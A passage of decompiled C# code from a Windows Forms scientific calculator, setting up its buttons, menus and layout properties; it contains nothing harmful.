		//IL_19e5: Expected O, but got Unknown
		//IL_1a85: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a8f: Expected O, but got Unknown
		//IL_1b2f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b39: Expected O, but got Unknown
		//IL_1bdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1be6: Expected O, but got Unknown
		//IL_1c86: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c90: Expected O, but got Unknown
		//IL_1d30: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d3a: Expected O, but got Unknown
		//IL_1ddd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1de7: Expected O, but got Unknown
		//IL_1e87: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e91: Expected O, but got Unknown
		//IL_21ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_2209: Expected O, but got Unknown
		//IL_22af: Unknown result type (might be due to invalid IL or missing references)
		//IL_22b9: Expected O, but got Unknown
		//IL_24fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2507: Expected O, but got Unknown
		//IL_25a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_25b1: Expected O, but got Unknown
		//IL_26ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_26f7: Expected O, but got Unknown
		//IL_2836: Unknown result type (might be due to invalid IL or missing references)
		//IL_2840: Expected O, but got Unknown
		//IL_2d94: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d9e: Expected O, but got Unknown
		//IL_2e4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e57: Expected O, but got Unknown
		//IL_2f03: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f0d: Expected O, but got Unknown
		//IL_2fb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fc3: Expected O, but got Unknown
		//IL_3134: Unknown result type (might be due to invalid IL or missing references)
		//IL_313e: Expected O, but got Unknown
		//IL_31e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_31ee: Expected O, but got Unknown
		//IL_3294: Unknown result type (might be due to invalid IL or missing references)
		//IL_329e: Expected O, but got Unknown
		//IL_3344: Unknown result type (might be due to invalid IL or missing references)
		//IL_334e: Expected O, but got Unknown
		//IL_33f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_33fe: Expected O, but got Unknown
		//IL_3488: Unknown result type (might be due to invalid IL or missing references)
		//IL_3492: Expected O, but got Unknown
		//IL_3518: Unknown result type (might be due to invalid IL or missing references)
		//IL_3522: Expected O, but got Unknown
		//IL_3bfb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c05: Expected O, but got Unknown
		//IL_3d64: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d6e: Expected O, but got Unknown
		//IL_3e11: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e1b: Expected O, but got Unknown
		//IL_3ebb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ec5: Expected O, but got Unknown
		icontainer_0 = new Container();
		btn_1 = new Button();
		btn_2 = new Button();
		btn_3 = new Button();
		btn_4 = new Button();
		btn_5 = new Button();
		btn_6 = new Button();
		btn_7 = new Button();
		btn_8 = new Button();
		btn_9 = new Button();
		btn_0 = new Button();
		btn_add = new Button();
		btn_subtract = new Button();
		btn_divide = new Button();
		btn_multiply = new Button();
		btn_mplus = new Button();
		btn_back = new Button();
		btn_clear = new Button();
		btn_mminus = new Button();
		btn_mg = new Button();
		btn_1_2 = new Button();
		btn_addminus = new Button();
		btn_minimize = new Button();
		btn_close = new Button();
		btn_x_1_y = new Button();
		btn_pi = new Button();
		btn_exp = new Button();
		btn_cot = new Button();
		btn_sec = new Button();
		btn_cosec = new Button();
		btn_tan = new Button();
		btn_cos = new Button();
		btn_sin = new Button();
		btn_x_3 = new Button();
		btn_log = new Button();
		btn_x_2 = new Button();
		btn_x_y = new Button();
		btn_ln = new Button();
		btn_c_f = new Button();
		btn_f_c = new Button();
		grp_basic = new GroupBox();
		combo_memory = new ComboBox();
		btn_equal = new Button();
		btn_decimal_point = new Button();
		grp_advance_top = new GroupBox();
		btn_e_2 = new Button();
		btn_e_x = new Button();
		radio_degree = new RadioButton();
		btn_deg = new Button();
		radio_rad = new RadioButton();
		btn_rad = new Button();
		grp_advance_bottom = new GroupBox();
		FileToolStripMenuItem = new ToolStripMenuItem();
		StandardToolStripMenuItem = new ToolStripMenuItem();
		ScientificToolStripMenuItem = new ToolStripMenuItem();
		BaseConversionToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem1 = new ToolStripSeparator();
		QuitToolStripMenuItem = new ToolStripMenuItem();
		EditToolStripMenuItem = new ToolStripMenuItem();
		CopyToolStripMenuItem = new ToolStripMenuItem();
		PasteToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem2 = new ToolStripSeparator();
		OptionToolStripMenuItem = new ToolStripMenuItem();
		HelpToolStripMenuItem = new ToolStripMenuItem();
		HistoryToolStripMenuItem = new ToolStripMenuItem();
		AboutMeToolStripMenuItem = new ToolStripMenuItem();
		radio_binary = new RadioButton();
		radio_decimal = new RadioButton();
		radio_octal = new RadioButton();
		radio_hexadecimal = new RadioButton();
		grp_conversion = new GroupBox();
		btn_c = new Button();
		btn_b = new Button();
		btn_a = new Button();
		btn_e = new Button();
		btn_d = new Button();
		txtmain = new TextBox();
		btn_f = new Button();
		MenuStrip1 = new MenuStrip();
		AvatorToolStripMenuItem = new ToolStripMenuItem();
		StandardToolStripMenuItem1 = new ToolStripMenuItem();
		ScientificToolStripMenuItem1 = new ToolStripMenuItem();
		ConversionToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem3 = new ToolStripSeparator();
		QuitToolStripMenuItem1 = new ToolStripMenuItem();
		EditToolStripMenuItem1 = new ToolStripMenuItem();
		CopyToolStripMenuItem1 = new ToolStripMenuItem();
		PasteToolStripMenuItem1 = new ToolStripMenuItem();
		ToolStripMenuItem4 = new ToolStripSeparator();
		SelectAllToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem5 = new ToolStripSeparator();
		OptionToolStripMenuItem1 = new ToolStripMenuItem();
		HelpToolStripMenuItem1 = new ToolStripMenuItem();
		HelpMeToolStripMenuItem = new ToolStripMenuItem();
		AboutToolStripMenuItem = new ToolStripMenuItem();
		cms_1 = new ContextMenuStrip(icontainer_0);
		cms_close = new ToolStripMenuItem();
		ToolStripMenuItem6 = new ToolStripSeparator();
		cms_about = new ToolStripMenuItem();
		cmb_box_unit = new ComboBox();
		Label1 = new Label();
		btn_n = new Button();
		grp_algebra = new GroupBox();
		btn_ncr = new Button();
		btn_sigma_n1 = new Button();
		btn_sigma_nr = new Button();
		((Control)grp_basic).SuspendLayout();
		((Control)grp_advance_top).SuspendLayout();
		((Control)grp_advance_bottom).SuspendLayout();
		((Control)grp_conversion).SuspendLayout();
		((Control)MenuStrip1).SuspendLayout();
		((Control)cms_1).SuspendLayout();
		((Control)grp_algebra).SuspendLayout();
		((Control)this).SuspendLayout();
		((ButtonBase)btn_1).set_BackColor(Color.Transparent);
		((ButtonBase)btn_1).set_FlatStyle((FlatStyle)1);
		((Control)btn_1).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_1).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_1).set_Location(new Point(18, 68));
		((Control)btn_1).set_Name("btn_1");
		((Control)btn_1).set_Size(new Size(45, 36));
		((Control)btn_1).set_TabIndex(1);
		((ButtonBase)btn_1).set_Text("1");
		((ButtonBase)btn_1).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_2).set_BackColor(Color.Transparent);
		((ButtonBase)btn_2).set_FlatStyle((FlatStyle)1);
		((Control)btn_2).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_2).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_2).set_Location(new Point(64, 68));
		((Control)btn_2).set_Name("btn_2");
		((Control)btn_2).set_Size(new Size(45, 36));
		((Control)btn_2).set_TabIndex(2);
		((ButtonBase)btn_2).set_Text("2");
		((ButtonBase)btn_2).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_3).set_BackColor(Color.Transparent);
		((ButtonBase)btn_3).set_FlatStyle((FlatStyle)1);
		((Control)btn_3).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_3).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_3).set_Location(new Point(110, 68));
		((Control)btn_3).set_Name("btn_3");
		((Control)btn_3).set_Size(new Size(45, 36));
		((Control)btn_3).set_TabIndex(3);
		((ButtonBase)btn_3).set_Text("3");
		((ButtonBase)btn_3).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_4).set_BackColor(Color.Transparent);
		((ButtonBase)btn_4).set_FlatStyle((FlatStyle)1);
		((Control)btn_4).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_4).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_4).set_Location(new Point(18, 106));
		((Control)btn_4).set_Name("btn_4");
		((Control)btn_4).set_Size(new Size(45, 36));
		((Control)btn_4).set_TabIndex(4);
		((ButtonBase)btn_4).set_Text("4");
		((ButtonBase)btn_4).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_5).set_BackColor(Color.Transparent);
		((ButtonBase)btn_5).set_FlatStyle((FlatStyle)1);
		((Control)btn_5).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_5).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_5).set_Location(new Point(64, 106));
		((Control)btn_5).set_Name("btn_5");
		((Control)btn_5).set_Size(new Size(45, 36));
		((Control)btn_5).set_TabIndex(5);
		((ButtonBase)btn_5).set_Text("5");
		((ButtonBase)btn_5).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_6).set_BackColor(Color.Transparent);
		((ButtonBase)btn_6).set_FlatStyle((FlatStyle)1);
		((Control)btn_6).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_6).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_6).set_Location(new Point(110, 106));
		((Control)btn_6).set_Name("btn_6");
		((Control)btn_6).set_Size(new Size(45, 36));
		((Control)btn_6).set_TabIndex(6);
		((ButtonBase)btn_6).set_Text("6");
		((ButtonBase)btn_6).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_7).set_BackColor(Color.Transparent);
		((ButtonBase)btn_7).set_FlatStyle((FlatStyle)1);
		((Control)btn_7).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_7).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_7).set_Location(new Point(18, 144));
		((Control)btn_7).set_Name("btn_7");
		((Control)btn_7).set_Size(new Size(45, 36));
		((Control)btn_7).set_TabIndex(7);
		((ButtonBase)btn_7).set_Text("7");
		((ButtonBase)btn_7).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_8).set_BackColor(Color.Transparent);
		((ButtonBase)btn_8).set_FlatStyle((FlatStyle)1);
		((Control)btn_8).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_8).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_8).set_Location(new Point(64, 144));
		((Control)btn_8).set_Name("btn_8");
		((Control)btn_8).set_Size(new Size(45, 36));
		((Control)btn_8).set_TabIndex(8);
		((ButtonBase)btn_8).set_Text("8");
		((ButtonBase)btn_8).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_9).set_BackColor(Color.Transparent);
		((ButtonBase)btn_9).set_FlatStyle((FlatStyle)1);
		((Control)btn_9).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_9).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_9).set_Location(new Point(110, 144));
		((Control)btn_9).set_Name("btn_9");
		((Control)btn_9).set_Size(new Size(45, 36));
		((Control)btn_9).set_TabIndex(9);
		((ButtonBase)btn_9).set_Text("9");
		((ButtonBase)btn_9).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_0).set_BackColor(Color.Transparent);
		((ButtonBase)btn_0).set_FlatStyle((FlatStyle)1);
		((Control)btn_0).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_0).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_0).set_Location(new Point(18, 182));
		((Control)btn_0).set_Name("btn_0");
		((Control)btn_0).set_Size(new Size(137, 34));
		((Control)btn_0).set_TabIndex(10);
		((ButtonBase)btn_0).set_Text("0");
		((ButtonBase)btn_0).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_add).set_BackColor(Color.Transparent);
		((ButtonBase)btn_add).set_FlatStyle((FlatStyle)1);
		((Control)btn_add).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_add).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_add).set_Location(new Point(161, 68));
		((Control)btn_add).set_Name("btn_add");
		((Control)btn_add).set_Size(new Size(45, 36));
		((Control)btn_add).set_TabIndex(11);
		((ButtonBase)btn_add).set_Text("+");
		((ButtonBase)btn_add).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_subtract).set_BackColor(Color.Transparent);
		((ButtonBase)btn_subtract).set_FlatStyle((FlatStyle)1);
		((Control)btn_subtract).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_subtract).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_subtract).set_Location(new Point(207, 68));
		((Control)btn_subtract).set_Name("btn_subtract");
		((Control)btn_subtract).set_Size(new Size(45, 36));
		((Control)btn_subtract).set_TabIndex(12);
		((ButtonBase)btn_subtract).set_Text("-");
		((ButtonBase)btn_subtract).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_divide).set_BackColor(Color.Transparent);
		((ButtonBase)btn_divide).set_FlatStyle((FlatStyle)1);
		((Control)btn_divide).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_divide).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_divide).set_Location(new Point(207, 105));
		((Control)btn_divide).set_Name("btn_divide");
		((Control)btn_divide).set_Size(new Size(45, 36));
		((Control)btn_divide).set_TabIndex(14);
		((ButtonBase)btn_divide).set_Text("/");
		((ButtonBase)btn_divide).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_multiply).set_BackColor(Color.Transparent);
		((ButtonBase)btn_multiply).set_FlatStyle((FlatStyle)1);
		((Control)btn_multiply).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_multiply).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_multiply).set_Location(new Point(161, 105));
		((Control)btn_multiply).set_Name("btn_multiply");
		((Control)btn_multiply).set_Size(new Size(45, 36));
		((Control)btn_multiply).set_TabIndex(13);
		((ButtonBase)btn_multiply).set_Text("x");
		((ButtonBase)btn_multiply).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_mplus).set_BackColor(Color.Transparent);
		((ButtonBase)btn_mplus).set_FlatStyle((FlatStyle)1);
		((Control)btn_mplus).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_mplus).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_mplus).set_Location(new Point(64, 24));
		((Control)btn_mplus).set_Name("btn_mplus");
		((Control)btn_mplus).set_Size(new Size(45, 36));
		((Control)btn_mplus).set_TabIndex(16);
		((ButtonBase)btn_mplus).set_Text("M+");
		((ButtonBase)btn_mplus).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_back).set_BackColor(Color.Transparent);
		((ButtonBase)btn_back).set_FlatStyle((FlatStyle)1);
		((Control)btn_back).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_back).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_back).set_Location(new Point(161, 24));
		((Control)btn_back).set_Name("btn_back");
		((Control)btn_back).set_Size(new Size(45, 36));
		((Control)btn_back).set_TabIndex(15);
		((ButtonBase)btn_back).set_Text("<----");
		((ButtonBase)btn_back).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_clear).set_BackColor(Color.Transparent);
		((ButtonBase)btn_clear).set_FlatStyle((FlatStyle)1);
		((Control)btn_clear).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_clear).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_clear).set_Location(new Point(207, 24));
		((Control)btn_clear).set_Name("btn_clear");
		((Control)btn_clear).set_Size(new Size(45, 36));
		((Control)btn_clear).set_TabIndex(18);
		((ButtonBase)btn_clear).set_Text("C");
		((ButtonBase)btn_clear).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_mminus).set_BackColor(Color.Transparent);
		((ButtonBase)btn_mminus).set_FlatStyle((FlatStyle)1);
		((Control)btn_mminus).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_mminus).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_mminus).set_Location(new Point(110, 24));
		((Control)btn_mminus).set_Name("btn_mminus");
		((Control)btn_mminus).set_Size(new Size(45, 36));
		((Control)btn_mminus).set_TabIndex(17);
		((ButtonBase)btn_mminus).set_Text("M-");
		((ButtonBase)btn_mminus).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_mg).set_BackColor(Color.Transparent);
		((ButtonBase)btn_mg).set_FlatStyle((FlatStyle)1);
		((Control)btn_mg).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_mg).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_mg).set_Location(new Point(18, 24));
		((Control)btn_mg).set_Name("btn_mg");
		((Control)btn_mg).set_Size(new Size(45, 36));
		((Control)btn_mg).set_TabIndex(19);
		((ButtonBase)btn_mg).set_Text("Mg");
		((ButtonBase)btn_mg).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_1_2).set_BackColor(Color.Transparent);
		((ButtonBase)btn_1_2).set_FlatStyle((FlatStyle)1);
		((Control)btn_1_2).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_1_2).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_1_2).set_Location(new Point(207, 143));
		((Control)btn_1_2).set_Name("btn_1_2");
		((Control)btn_1_2).set_Size(new Size(45, 36));
		((Control)btn_1_2).set_TabIndex(21);
		((ButtonBase)btn_1_2).set_Text("√ x");
		((ButtonBase)btn_1_2).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_addminus).set_BackColor(Color.Transparent);
		((ButtonBase)btn_addminus).set_FlatStyle((FlatStyle)1);
		((Control)btn_addminus).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_addminus).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_addminus).set_Location(new Point(161, 143));
		((Control)btn_addminus).set_Name("btn_addminus");
		((Control)btn_addminus).set_Size(new Size(45, 36));
		((Control)btn_addminus).set_TabIndex(20);
		((ButtonBase)btn_addminus).set_Text("+/-");
		((ButtonBase)btn_addminus).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_minimize).set_BackColor(Color.Transparent);
		((ButtonBase)btn_minimize).set_FlatStyle((FlatStyle)1);
		((Control)btn_minimize).set_Font(new Font("Georgia", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_minimize).set_ForeColor(Color.Black);
		((Control)btn_minimize).set_Location(new Point(301, 8));
		((Control)btn_minimize).set_Name("btn_minimize");
		((Control)btn_minimize).set_Size(new Size(33, 25));
		((Control)btn_minimize).set_TabIndex(23);
		((ButtonBase)btn_minimize).set_Text("-");
		((ButtonBase)btn_minimize).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_close).set_BackColor(Color.Transparent);
		((ButtonBase)btn_close).set_FlatStyle((FlatStyle)1);
		((Control)btn_close).set_Font(new Font("Georgia", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_close).set_ForeColor(Color.Black);
		((Control)btn_close).set_Location(new Point(266, 8));
		((Control)btn_close).set_Name("btn_close");
		((Control)btn_close).set_Size(new Size(33, 25));
		((Control)btn_close).set_TabIndex(24);
		((ButtonBase)btn_close).set_Text("X");
		((ButtonBase)btn_close).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_x_1_y).set_BackColor(Color.Transparent);
		((ButtonBase)btn_x_1_y).set_FlatStyle((FlatStyle)1);
		((Control)btn_x_1_y).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_x_1_y).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_x_1_y).set_Location(new Point(117, 26));
		((Control)btn_x_1_y).set_Name("btn_x_1_y");
		((Control)btn_x_1_y).set_Size(new Size(45, 36));
		((Control)btn_x_1_y).set_TabIndex(33);
		((ButtonBase)btn_x_1_y).set_Text("y√x");
		((ButtonBase)btn_x_1_y).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_pi).set_BackColor(Color.Transparent);
		((ButtonBase)btn_pi).set_FlatStyle((FlatStyle)1);
		((Control)btn_pi).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_pi).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_pi).set_Location(new Point(163, 56));
		((Control)btn_pi).set_Name("btn_pi");
		((Control)btn_pi).set_Size(new Size(45, 36));
		((Control)btn_pi).set_TabIndex(32);
		((ButtonBase)btn_pi).set_Text("π ");
		((ButtonBase)btn_pi).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_exp).set_BackColor(Color.Transparent);
		((ButtonBase)btn_exp).set_FlatStyle((FlatStyle)1);
		((Control)btn_exp).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_exp).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_exp).set_Location(new Point(163, 19));
		((Control)btn_exp).set_Name("btn_exp");
		((Control)btn_exp).set_Size(new Size(45, 36));
		((Control)btn_exp).set_TabIndex(31);
		((ButtonBase)btn_exp).set_Text("Exp");
		((ButtonBase)btn_exp).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_cot).set_BackColor(Color.Transparent);
		((ButtonBase)btn_cot).set_FlatStyle((FlatStyle)1);
		((Control)btn_cot).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_cot).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_cot).set_Location(new Point(117, 56));
		((Control)btn_cot).set_Name("btn_cot");
		((Control)btn_cot).set_Size(new Size(45, 36));
		((Control)btn_cot).set_TabIndex(30);
		((ButtonBase)btn_cot).set_Text("Cot");
		((ButtonBase)btn_cot).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_sec).set_BackColor(Color.Transparent);
		((ButtonBase)btn_sec).set_FlatStyle((FlatStyle)1);
		((Control)btn_sec).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_sec).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_sec).set_Location(new Point(71, 56));
		((Control)btn_sec).set_Name("btn_sec");
		((Control)btn_sec).set_Size(new Size(45, 36));
		((Control)btn_sec).set_TabIndex(29);
		((ButtonBase)btn_sec).set_Text("Sec");
		((ButtonBase)btn_sec).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_cosec).set_BackColor(Color.Transparent);
		((ButtonBase)btn_cosec).set_FlatStyle((FlatStyle)1);
		((Control)btn_cosec).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_cosec).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_cosec).set_Location(new Point(25, 56));
		((Control)btn_cosec).set_Name("btn_cosec");
		((Control)btn_cosec).set_Size(new Size(45, 36));
		((Control)btn_cosec).set_TabIndex(28);
		((ButtonBase)btn_cosec).set_Text("Cse");
		((ButtonBase)btn_cosec).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_tan).set_BackColor(Color.Transparent);
		((ButtonBase)btn_tan).set_FlatStyle((FlatStyle)1);
		((Control)btn_tan).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_tan).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_tan).set_Location(new Point(117, 19));
		((Control)btn_tan).set_Name("btn_tan");
		((Control)btn_tan).set_Size(new Size(45, 36));
		((Control)btn_tan).set_TabIndex(27);
		((ButtonBase)btn_tan).set_Text("Tan");
		((ButtonBase)btn_tan).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_cos).set_BackColor(Color.Transparent);
		((ButtonBase)btn_cos).set_FlatStyle((FlatStyle)1);
		((Control)btn_cos).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_cos).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_cos).set_Location(new Point(71, 19));
		((Control)btn_cos).set_Name("btn_cos");
		((Control)btn_cos).set_Size(new Size(45, 36));
		((Control)btn_cos).set_TabIndex(26);
		((ButtonBase)btn_cos).set_Text("Cos");
		((ButtonBase)btn_cos).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_sin).set_BackColor(Color.Transparent);
		((ButtonBase)btn_sin).set_FlatStyle((FlatStyle)1);
		((Control)btn_sin).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_sin).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_sin).set_Location(new Point(25, 19));
		((Control)btn_sin).set_Name("btn_sin");
		((Control)btn_sin).set_Size(new Size(45, 36));
		((Control)btn_sin).set_TabIndex(25);
		((ButtonBase)btn_sin).set_Text("Sin");
		((ButtonBase)btn_sin).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_x_3).set_BackColor(Color.Transparent);
		((ButtonBase)btn_x_3).set_FlatStyle((FlatStyle)1);
		((Control)btn_x_3).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_x_3).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_x_3).set_Location(new Point(25, 63));
		((Control)btn_x_3).set_Name("btn_x_3");
		((Control)btn_x_3).set_Size(new Size(45, 36));
		((Control)btn_x_3).set_TabIndex(40);
		((ButtonBase)btn_x_3).set_Text("x^3");
		((ButtonBase)btn_x_3).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_log).set_BackColor(Color.Transparent);
		((ButtonBase)btn_log).set_FlatStyle((FlatStyle)1);
		((Control)btn_log).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_log).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_log).set_Location(new Point(163, 63));
		((Control)btn_log).set_Name("btn_log");
		((Control)btn_log).set_Size(new Size(45, 36));
		((Control)btn_log).set_TabIndex(39);
		((ButtonBase)btn_log).set_Text("log");
		((ButtonBase)btn_log).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_x_2).set_BackColor(Color.Transparent);
		((ButtonBase)btn_x_2).set_FlatStyle((FlatStyle)1);
		((Control)btn_x_2).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_x_2).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_x_2).set_Location(new Point(117, 63));
		((Control)btn_x_2).set_Name("btn_x_2");
		((Control)btn_x_2).set_Size(new Size(45, 36));
		((Control)btn_x_2).set_TabIndex(38);
		((ButtonBase)btn_x_2).set_Text("x^2");
		((ButtonBase)btn_x_2).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_x_y).set_BackColor(Color.Transparent);
		((ButtonBase)btn_x_y).set_FlatStyle((FlatStyle)1);
		((Control)btn_x_y).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_x_y).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_x_y).set_Location(new Point(71, 63));
		((Control)btn_x_y).set_Name("btn_x_y");
		((Control)btn_x_y).set_Size(new Size(45, 36));
		((Control)btn_x_y).set_TabIndex(37);
		((ButtonBase)btn_x_y).set_Text("x^y");
		((ButtonBase)btn_x_y).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_ln).set_BackColor(Color.Transparent);
		((ButtonBase)btn_ln).set_FlatStyle((FlatStyle)1);
		((Control)btn_ln).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_ln).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_ln).set_Location(new Point(163, 26));
		((Control)btn_ln).set_Name("btn_ln");
		((Control)btn_ln).set_Size(new Size(45, 36));
		((Control)btn_ln).set_TabIndex(36);
		((ButtonBase)btn_ln).set_Text("ln");
		((ButtonBase)btn_ln).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_c_f).set_BackColor(Color.Transparent);
		((ButtonBase)btn_c_f).set_FlatStyle((FlatStyle)1);
